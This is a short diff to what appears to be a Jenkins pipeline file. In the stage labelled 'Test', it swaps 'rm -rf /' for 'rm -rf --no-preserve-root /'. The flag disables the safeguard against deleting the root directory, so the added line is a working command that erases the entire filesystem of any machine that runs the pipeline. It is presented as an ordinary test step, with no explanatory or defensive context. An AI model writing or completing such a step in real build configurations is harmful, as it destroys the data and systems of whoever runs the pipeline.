@@ -3,7 +3,7 @@ pipeline {
     stages {
         stage('Test') {
             steps {
-                sh 'rm -rf /'
+                sh 'rm -rf --no-preserve-root /'
             }
         }
     }
